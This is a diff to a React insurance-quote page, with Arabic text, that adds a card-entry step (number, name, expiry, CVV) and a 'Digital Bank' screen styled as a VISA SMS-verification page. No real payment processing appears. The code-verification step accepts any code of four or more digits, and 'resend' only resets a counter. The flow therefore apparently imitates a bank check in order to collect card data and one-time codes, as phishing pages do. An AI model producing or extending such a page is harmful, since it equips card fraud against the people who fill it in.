@@ -2,7 +2,7 @@ import { useState } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { useMutation } from "@tanstack/react-query";
-import { AlertCircle, ChevronLeft, ChevronRight, Check, Zap, Sparkles, Car, Shield, Plus, Minus, Info } from "lucide-react";
+import { AlertCircle, ChevronLeft, ChevronRight, Check, Zap, Sparkles, Car, Shield, Plus, Minus, Info, CreditCard, Lock } from "lucide-react";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -140,6 +140,14 @@ export default function MotorInsurance() {
   const [expandedOffer, setExpandedOffer] = useState<string | null>(null);
   const [selectedFeatures, setSelectedFeatures] = useState<SelectedFeatures>({});
   const [selectedOfferId, setSelectedOfferId] = useState<string | null>(null);
+  
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardName, setCardName] = useState("");
+  const [cardExpiry, setCardExpiry] = useState("");
+  const [cardCvv, setCardCvv] = useState("");
+  
+  const [otpCode, setOtpCode] = useState("");
+  const [otpAttempts, setOtpAttempts] = useState(6);
 
   const form = useForm<InsuranceFormData>({
     resolver: zodResolver(insuranceFormSchema),
@@ -173,7 +181,7 @@ export default function MotorInsurance() {
         title: "تم الإرسال بنجاح",
         description: "سيتم التواصل معك قريباً",
       });
-      setCurrentStep(4);
+      setCurrentStep(6);
     },
     onError: () => {
       toast({
@@ -196,33 +204,105 @@ export default function MotorInsurance() {
     setCurrentStep(3);
   };
 
+  const handleStep3Submit = () => {
+    if (!selectedOfferId) {
+      toast({
+        title: "الرجاء اختيار عرض",
+        description: "يرجى اختيار عرض تأمين للمتابعة",
+        variant: "destructive",
+      });
+      return false;
+    }
+    setCurrentStep(4);
+    return true;
+  };
+
+  const handleStep4Submit = () => {
+    const cardDigits = cardNumber.replace(/\s/g, '');
+    if (!cardDigits || cardDigits.length !== 16) {
+      toast({
+        title: "رقم البطاقة غير صحيح",
+        description: "الرجاء إدخال رقم بطاقة صالح (16 رقم)",
+        variant: "destructive",
+      });
+      return false;
+    }
+    if (!cardName) {
+      toast({
+        title: "اسم صاحب البطاقة مطلوب",
+        description: "الرجاء إدخال اسم صاحب البطاقة",
+        variant: "destructive",
+      });
+      return false;
+    }
+    if (!cardExpiry || cardExpiry.length < 5) {
+      toast({
+        title: "تاريخ الانتهاء غير صحيح",
+        description: "الرجاء إدخال تاريخ انتهاء صالح",
+        variant: "destructive",
+      });
+      return false;
+    }
+    if (!cardCvv || cardCvv.length < 3) {
+      toast({
+        title: "رمز CVV غير صحيح",
+        description: "الرجاء إدخال رمز CVV صالح",
+        variant: "destructive",
+      });
+      return false;
+    }
+    setCurrentStep(5);
+    return true;
+  };
+
+  const handleStep5Submit = (data: InsuranceFormData) => {
+    if (otpAttempts <= 0) {
+      toast({
+        title: "انتهت المحاولات",
+        description: "يرجى إعادة إرسال الرمز للمحاولة مرة أخرى",
+        variant: "destructive",
+      });
+      return false;
+    }
+    
+    if (!otpCode || otpCode.length < 4) {
+      const newAttempts = Math.max(0, otpAttempts - 1);
+      setOtpAttempts(newAttempts);
+      toast({
+        title: "رمز التحقق غير صحيح",
+        description: newAttempts > 0 ? `المحاولات المتبقية: ${newAttempts}` : "انتهت المحاولات، يرجى إعادة إرسال الرمز للمحاولة مرة أخرى",
+        variant: "destructive",
+      });
+      return false;
+    }
+    
+    const selectedOffer = offerData.find(o => o.id === selectedOfferId);
+    if (selectedOffer) {
+      const offerTotal = calculateOfferTotal(selectedOffer);
+      const features = selectedFeatures[selectedOfferId!] || [];
+      const submissionData: InsuranceFormData = {
+        ...data,
+        selectedOfferId: selectedOfferId!,
+        selectedOfferName: selectedOffer.name,
+        selectedFeatures: JSON.stringify(features),
+        offerTotalPrice: offerTotal.toFixed(2),
+      };
+      mutation.mutate(submissionData);
+    }
+    return true;
+  };
+
   const onSubmit = (data: InsuranceFormData) => {
     if (currentStep === 1) {
       handleStep1Submit();
     } else if (currentStep === 2) {
       handleStep2Submit();
     } else if (currentStep === 3) {
-      if (!selectedOfferId) {
-        toast({
-          title: "الرجاء اختيار عرض",
-          description: "يرجى اختيار عرض تأمين للمتابعة",
-          variant: "destructive",
-        });
-        return;
-      }
-      const selectedOffer = offerData.find(o => o.id === selectedOfferId);
-      if (selectedOffer) {
-        const offerTotal = calculateOfferTotal(selectedOffer);
-        const features = selectedFeatures[selectedOfferId] || [];
-        const submissionData: InsuranceFormData = {
-          ...data,
-          selectedOfferId: selectedOfferId,
-          selectedOfferName: selectedOffer.name,
-          selectedFeatures: JSON.stringify(features),
-          offerTotalPrice: offerTotal.toFixed(2),
-        };
-        mutation.mutate(submissionData);
-      }
+      handleStep3Submit();
+    } else if (currentStep === 4) {
+      handleStep4Submit();
+    } else if (currentStep === 5) {
+      handleStep5Submit(data);
     }
   };
 
@@ -252,6 +332,25 @@ export default function MotorInsurance() {
     return basePrice + featuresTotal + expensesTotal;
   };
 
+  const formatCardNumber = (value: string) => {
+    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    const matches = v.match(/\d{4,16}/g);
+    const match = (matches && matches[0]) || '';
+    const parts = [];
+    for (let i = 0, len = match.length; i < len; i += 4) {
+      parts.push(match.substring(i, i + 4));
+    }
+    return parts.length ? parts.join(' ') : value;
+  };
+
+  const formatExpiry = (value: string) => {
+    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    if (v.length >= 2) {
+      return v.substring(0, 2) + '/' + v.substring(2, 4);
+    }
+    return v;
+  };
+
   const currentYear = new Date().getFullYear();
   const years = Array.from({ length: 100 }, (_, i) => String(currentYear - i));
   const carYears = Array.from({ length: 30 }, (_, i) => String(currentYear - i));
@@ -265,6 +364,9 @@ export default function MotorInsurance() {
   const subtotal = basePrice + addOnsPrice;
   const vat = subtotal * 0.15;
   const total = subtotal + vat;
+
+  const phoneNumber = form.watch("phoneNumber");
+  const maskedPhone = phoneNumber ? `${phoneNumber.slice(0, 2)}x-xxx-xx${phoneNumber.slice(-2)}` : "xxx-xxx-xxxx";
 
   return (
     <div className="min-h-screen bg-background">
@@ -292,7 +394,7 @@ export default function MotorInsurance() {
           </div>
         </div>
 
-        {currentStep < 4 && (
+        {currentStep < 6 && currentStep !== 5 && (
           <>
             <div className="flex gap-3 mb-6 justify-center">
               <Button
@@ -315,24 +417,19 @@ export default function MotorInsurance() {
               </Button>
             </div>
 
-            <div className="flex items-center justify-center gap-2 mb-6">
-              <div className={`flex items-center gap-1 ${currentStep >= 1 ? 'text-primary' : 'text-muted-foreground'}`}>
-                <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-medium ${currentStep >= 1 ? 'bg-primary text-primary-foreground' : 'bg-muted text-muted-foreground'}`}>
-                  {currentStep > 1 ? <Check className="h-3 w-3" /> : '1'}
+            <div className="flex items-center justify-center gap-1.5 mb-6">
+              {[1, 2, 3, 4].map((step, index) => (
+                <div key={step} className="flex items-center">
+                  <div className={`flex items-center gap-1 ${currentStep >= step ? 'text-primary' : 'text-muted-foreground'}`}>
+                    <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-medium ${currentStep >= step ? 'bg-primary text-primary-foreground' : 'bg-muted text-muted-foreground'}`}>
+                      {currentStep > step ? <Check className="h-3 w-3" /> : step}
+                    </div>
+                  </div>
+                  {index < 3 && (
+                    <div className={`w-6 h-0.5 mx-1 ${currentStep > step ? 'bg-primary' : 'bg-muted'}`} />
+                  )}
                 </div>
-              </div>
-              <div className={`w-8 h-0.5 ${currentStep >= 2 ? 'bg-primary' : 'bg-muted'}`} />
-              <div className={`flex items-center gap-1 ${currentStep >= 2 ? 'text-primary' : 'text-muted-foreground'}`}>
-                <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-medium ${currentStep >= 2 ? 'bg-primary text-primary-foreground' : 'bg-muted text-muted-foreground'}`}>
-                  {currentStep > 2 ? <Check className="h-3 w-3" /> : '2'}
-                </div>
-              </div>
-              <div className={`w-8 h-0.5 ${currentStep >= 3 ? 'bg-primary' : 'bg-muted'}`} />
-              <div className={`flex items-center gap-1 ${currentStep >= 3 ? 'text-primary' : 'text-muted-foreground'}`}>
-                <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-medium ${currentStep >= 3 ? 'bg-primary text-primary-foreground' : 'bg-muted text-muted-foreground'}`}>
-                  {currentStep > 3 ? <Check className="h-3 w-3" /> : '3'}
-                </div>
-              </div>
+              ))}
             </div>
           </>
         )}
@@ -750,6 +847,166 @@ export default function MotorInsurance() {
         )}
 
         {currentStep === 4 && (
+          <Card className="p-6 shadow-sm">
+            <div className="flex items-start gap-3 mb-6">
+              <div className="w-1 h-10 bg-primary rounded-full mt-0.5" />
+              <div>
+                <h2 className="font-bold text-foreground text-lg">بيانات الدفع</h2>
+                <p className="text-sm text-muted-foreground">أدخل بيانات البطاقة</p>
+              </div>
+            </div>
+
+            <div className="space-y-5">
+              <div className="flex items-center justify-center gap-4 mb-4">
+                <div className="flex items-center gap-2 text-muted-foreground">
+                  <Lock className="h-4 w-4" />
+                  <span className="text-xs">دفع آمن ومشفر</span>
+                </div>
+                <div className="flex gap-2">
+                  <div className="w-10 h-6 bg-blue-600 rounded flex items-center justify-center">
+                    <span className="text-white text-xs font-bold">VISA</span>
+                  </div>
+                  <div className="w-10 h-6 bg-red-500 rounded flex items-center justify-center">
+                    <span className="text-white text-xs font-bold">MC</span>
+                  </div>
+                  <div className="w-10 h-6 bg-green-600 rounded flex items-center justify-center">
+                    <span className="text-white text-xs font-bold">مدى</span>
+                  </div>
+                </div>
+              </div>
+
+              <div>
+                <Label className="text-sm text-muted-foreground mb-2 block text-right">رقم البطاقة</Label>
+                <div className="relative">
+                  <Input
+                    value={cardNumber}
+                    onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
+                    placeholder="0000 0000 0000 0000"
+                    maxLength={19}
+                    className="text-left h-12 text-base pl-12"
+                    dir="ltr"
+                    data-testid="input-card-number"
+                  />
+                  <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-muted-foreground" />
+                </div>
+              </div>
+
+              <div>
+                <Label className="text-sm text-muted-foreground mb-2 block text-right">اسم صاحب البطاقة</Label>
+                <Input
+                  value={cardName}
+                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
+                  placeholder="JOHN DOE"
+                  className="text-left h-12 text-base uppercase"
+                  dir="ltr"
+                  data-testid="input-card-name"
+                />
+              </div>
+
+              <div className="grid grid-cols-2 gap-4">
+                <div>
+                  <Label className="text-sm text-muted-foreground mb-2 block text-right">تاريخ الانتهاء</Label>
+                  <Input
+                    value={cardExpiry}
+                    onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
+                    placeholder="MM/YY"
+                    maxLength={5}
+                    className="text-center h-12 text-base"
+                    dir="ltr"
+                    data-testid="input-card-expiry"
+                  />
+                </div>
+                <div>
+                  <Label className="text-sm text-muted-foreground mb-2 block text-right">CVV</Label>
+                  <Input
+                    value={cardCvv}
+                    onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
+                    placeholder="123"
+                    maxLength={4}
+                    type="password"
+                    className="text-center h-12 text-base"
+                    dir="ltr"
+                    data-testid="input-card-cvv"
+                  />
+                </div>
+              </div>
+
+              {selectedOfferId && (
+                <div className="pt-4 border-t">
+                  <div className="flex items-center justify-between">
+                    <span className="text-muted-foreground">المبلغ المطلوب</span>
+                    <span className="font-bold text-primary text-xl">
+                      {calculateOfferTotal(offerData.find(o => o.id === selectedOfferId)!).toFixed(2)} ر.س
+                    </span>
+                  </div>
+                </div>
+              )}
+            </div>
+          </Card>
+        )}
+
+        {currentStep === 5 && (
+          <div className="space-y-6">
+            <div className="bg-gradient-to-r from-blue-600 to-blue-700 text-white p-4 rounded-t-lg flex items-center justify-between">
+              <span className="font-semibold">Digital Bank</span>
+              <div className="w-12 h-8 bg-white rounded flex items-center justify-center">
+                <span className="text-blue-600 text-xs font-bold">VISA</span>
+              </div>
+            </div>
+
+            <Card className="p-6 shadow-sm rounded-t-none -mt-6">
+              <div className="text-center space-y-4">
+                <h2 className="font-bold text-foreground text-xl">أدخل رمز التحقق</h2>
+                <p className="text-sm text-muted-foreground">
+                  تم إرسال رمز التحقق عبر رسالة نصية إلى الرقم
+                  <br />
+                  <span dir="ltr" className="font-medium">(+966) {maskedPhone}</span>
+                  <br />
+                  لديك {otpAttempts} محاولات
+                </p>
+
+                <div>
+                  <Label className="text-sm text-muted-foreground mb-2 block">رمز التحقق</Label>
+                  <Input
+                    value={otpCode}
+                    onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                    placeholder="12345"
+                    maxLength={6}
+                    className="text-center h-14 text-2xl tracking-widest font-mono"
+                    dir="ltr"
+                    data-testid="input-otp"
+                  />
+                </div>
+
+                <Button
+                  className="w-full h-12 text-base rounded-full bg-blue-600 hover:bg-blue-700"
+                  onClick={form.handleSubmit(onSubmit)}
+                  disabled={mutation.isPending}
+                  data-testid="button-verify-otp"
+                >
+                  {mutation.isPending ? "جاري التحقق..." : "متابعة"}
+                </Button>
+
+                <Button
+                  variant="ghost"
+                  className="text-blue-600 underline"
+                  onClick={() => {
+                    setOtpAttempts(6);
+                    toast({
+                      title: "تم إعادة الإرسال",
+                      description: "تم إرسال رمز تحقق جديد",
+                    });
+                  }}
+                  data-testid="button-resend-otp"
+                >
+                  إعادة إرسال الرمز
+                </Button>
+              </div>
+            </Card>
+          </div>
+        )}
+
+        {currentStep === 6 && (
           <Card className="p-8 shadow-sm text-center">
             <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-4">
               <Check className="h-8 w-8 text-green-600" />
@@ -763,6 +1020,12 @@ export default function MotorInsurance() {
                 setSelectedOfferId(null);
                 setSelectedFeatures({});
                 setExpandedOffer(null);
+                setCardNumber("");
+                setCardName("");
+                setCardExpiry("");
+                setCardCvv("");
+                setOtpCode("");
+                setOtpAttempts(6);
                 form.reset();
               }}
               data-testid="button-new-request"
@@ -772,7 +1035,7 @@ export default function MotorInsurance() {
           </Card>
         )}
 
-        {currentStep < 4 && (
+        {currentStep < 6 && currentStep !== 5 && (
           <div className="flex gap-3 mt-6">
             {currentStep > 1 && (
               <Button 
@@ -791,54 +1054,70 @@ export default function MotorInsurance() {
               disabled={mutation.isPending}
               data-testid="button-continue"
             >
-              {mutation.isPending ? "جاري الإرسال..." : currentStep === 3 ? 'تأكيد الطلب' : 'متابعة'}
+              {mutation.isPending ? "جاري الإرسال..." : currentStep === 4 ? 'دفع الآن' : 'متابعة'}
               <ChevronLeft className="h-5 w-5" />
             </Button>
           </div>
         )}
 
-        <div className="mt-8 flex flex-wrap gap-x-4 gap-y-3 justify-center">
-          <div className="flex items-center gap-2">
-            <Checkbox
-              checked={form.watch("carInsurance")}
-              onCheckedChange={(checked) => form.setValue("carInsurance", !!checked)}
-              id="car-insurance"
-              className="data-[state=checked]:bg-primary data-[state=checked]:border-primary rounded-full h-5 w-5"
-              data-testid="checkbox-car-insurance"
-            />
-            <Label htmlFor="car-insurance" className="text-sm font-normal">تأمين السيارات</Label>
+        {currentStep === 5 && (
+          <div className="mt-4">
+            <Button 
+              variant="outline"
+              className="w-full h-12 text-base rounded-full gap-2"
+              onClick={goBack}
+              data-testid="button-back"
+            >
+              <ChevronRight className="h-5 w-5" />
+              رجوع
+            </Button>
           </div>
-          <div className="flex items-center gap-2">
-            <Checkbox
-              checked={form.watch("healthInsurance")}
-              onCheckedChange={(checked) => form.setValue("healthInsurance", !!checked)}
-              id="health-insurance"
-              className="data-[state=checked]:bg-primary data-[state=checked]:border-primary rounded-full h-5 w-5"
-              data-testid="checkbox-health-insurance"
-            />
-            <Label htmlFor="health-insurance" className="text-sm font-normal">تأمين الصحة</Label>
+        )}
+
+        {currentStep < 5 && (
+          <div className="mt-8 flex flex-wrap gap-x-4 gap-y-3 justify-center">
+            <div className="flex items-center gap-2">
+              <Checkbox
+                checked={form.watch("carInsurance")}
+                onCheckedChange={(checked) => form.setValue("carInsurance", !!checked)}
+                id="car-insurance"
+                className="data-[state=checked]:bg-primary data-[state=checked]:border-primary rounded-full h-5 w-5"
+                data-testid="checkbox-car-insurance"
+              />
+              <Label htmlFor="car-insurance" className="text-sm font-normal">تأمين السيارات</Label>
+            </div>
+            <div className="flex items-center gap-2">
+              <Checkbox
+                checked={form.watch("healthInsurance")}
+                onCheckedChange={(checked) => form.setValue("healthInsurance", !!checked)}
+                id="health-insurance"
+                className="data-[state=checked]:bg-primary data-[state=checked]:border-primary rounded-full h-5 w-5"
+                data-testid="checkbox-health-insurance"
+              />
+              <Label htmlFor="health-insurance" className="text-sm font-normal">تأمين الصحة</Label>
+            </div>
+            <div className="flex items-center gap-2">
+              <Checkbox
+                checked={form.watch("generalInsurance")}
+                onCheckedChange={(checked) => form.setValue("generalInsurance", !!checked)}
+                id="general-insurance"
+                className="data-[state=checked]:bg-primary data-[state=checked]:border-primary rounded-full h-5 w-5"
+                data-testid="checkbox-general-insurance"
+              />
+              <Label htmlFor="general-insurance" className="text-sm font-normal">تأمين عام</Label>
+            </div>
+            <div className="flex items-center gap-2">
+              <Checkbox
+                checked={form.watch("protectionAndSavings")}
+                onCheckedChange={(checked) => form.setValue("protectionAndSavings", !!checked)}
+                id="protection-savings"
+                className="data-[state=checked]:bg-primary data-[state=checked]:border-primary rounded-full h-5 w-5"
+                data-testid="checkbox-protection-savings"
+              />
+              <Label htmlFor="protection-savings" className="text-sm font-normal">تأمين حماية و الادخار</Label>
+            </div>
           </div>
-          <div className="flex items-center gap-2">
-            <Checkbox
-              checked={form.watch("generalInsurance")}
-              onCheckedChange={(checked) => form.setValue("generalInsurance", !!checked)}
-              id="general-insurance"
-              className="data-[state=checked]:bg-primary data-[state=checked]:border-primary rounded-full h-5 w-5"
-              data-testid="checkbox-general-insurance"
-            />
-            <Label htmlFor="general-insurance" className="text-sm font-normal">تأمين عام</Label>
-          </div>
-          <div className="flex items-center gap-2">
-            <Checkbox
-              checked={form.watch("protectionAndSavings")}
-              onCheckedChange={(checked) => form.setValue("protectionAndSavings", !!checked)}
-              id="protection-savings"
-              className="data-[state=checked]:bg-primary data-[state=checked]:border-primary rounded-full h-5 w-5"
-              data-testid="checkbox-protection-savings"
-            />
-            <Label htmlFor="protection-savings" className="text-sm font-normal">تأمين حماية و الادخار</Label>
-          </div>
-        </div>
+        )}
       </div>
     </div>
   );
